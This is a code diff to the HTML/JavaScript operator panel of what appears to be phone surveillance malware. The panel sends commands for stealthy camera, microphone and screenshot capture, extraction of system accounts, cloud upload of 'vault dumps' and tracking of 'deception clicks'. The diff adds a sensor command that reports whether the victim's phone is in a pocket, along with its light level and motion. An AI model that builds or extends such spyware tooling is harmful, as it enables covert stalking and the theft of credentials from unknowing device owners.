@@ -272,7 +272,7 @@
                 </div>
             </div>
 
-            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic, brightness, blind, stealth">Surveillance (Optical / Audio / Display)</h2>
+            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic, brightness, blind, stealth, sensors, environment">Surveillance (Optical / Audio / Display / Environment)</h2>
             <div class="card">
                 <div class="cmd-row">
                     <label class="cmd-label">Display Authority (Dimmer)</label>
@@ -384,6 +384,7 @@
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">User Engagement (7D Trend)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_ENGAGEMENT')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ENGAGEMENT')">Fetch Usage Metrics</button></div></div>
@@ -766,6 +767,7 @@
                         content = `${document.getElementById('bri-level').value} | ${document.getElementById('bri-method').value}`; break;
                     case 'UNBLIND':
                     case 'GET_ACCOUNTS':
+                    case 'GET_SENSORS':
                         content = ''; break;
                 }
             }
@@ -853,6 +855,32 @@
                                 • UI_DIRECT: ${metrics.UI_OPEN || 0} | • DECEPTION_CLICKS: ${metrics.MIRROR_CLICK || 0}
                             </div>
                         `).join('')}
+                    </div>`;
+                }
+
+                if (c.file_name === 'GET_SENSORS' && c.result_data) {
+                    const d = c.result_data;
+                    dataHtml = `<div style="margin-top:10px; padding:15px; background:rgba(0,255,157,0.05); border:1px solid var(--success);">
+                        <div style="color:var(--success); font-size:0.75rem; font-weight:bold; margin-bottom:12px; border-bottom:1px solid #222;">PHYSICAL_ENVIRONMENT_MAP</div>
+                        
+                        <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                            <span style="color:#666; font-size:0.7rem;">PROXIMITY:</span>
+                            <span style="color:${d.is_covered ? 'var(--danger)' : '#fff'}; font-size:0.75rem;">${d.is_covered ? 'OBJECT_DETECTED (IN POCKET)' : 'NO_OBSTRUCTION'}</span>
+                        </div>
+
+                        <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                            <span style="color:#666; font-size:0.7rem;">LIGHT_LEVEL:</span>
+                            <span style="color:#fff; font-size:0.75rem;">${d.light_state} (${Math.round(d.lux)} LUX)</span>
+                        </div>
+
+                        <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+                            <span style="color:#666; font-size:0.7rem;">MOTION_STATE:</span>
+                            <span style="color:var(--primary); font-size:0.75rem;">${d.motion_state}</span>
+                        </div>
+
+                        <div style="margin-top:10px; font-size:0.55rem; color:#444; font-family:monospace; border-top:1px solid #222; padding-top:5px;">
+                            RAW_G_MAGNITUDE: ${d.accel_magnitude.toFixed(4)}
+                        </div>
                     </div>`;
                 }
 
